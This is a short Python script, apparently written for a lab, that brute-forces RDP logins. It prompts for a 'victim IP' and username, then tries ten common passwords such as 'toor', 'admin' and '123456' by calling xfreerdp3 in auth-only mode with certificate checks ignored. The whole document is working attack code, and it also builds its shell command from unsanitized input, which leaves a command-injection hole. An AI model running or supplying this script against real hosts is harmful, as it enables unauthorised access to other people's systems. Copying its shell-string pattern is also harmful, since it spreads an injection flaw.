import os
import time

target_ip = input("Enter victim IP (e.g., 10.0.2.6): ")
username = input("Enter username: ")

passwords = [
    "123456", "password", "kali", "toor", "letmein",
    "qwerty", "admin", "root", "pass123", "test123"
]

for i, password in enumerate(passwords, 1):
    print(f"[{i}] Trying password: {password}")
    result = os.system(f"xfreerdp3 /v:{target_ip} /u:{username} /p:{password} +auth-only /cert:ignore")
    time.sleep(1)
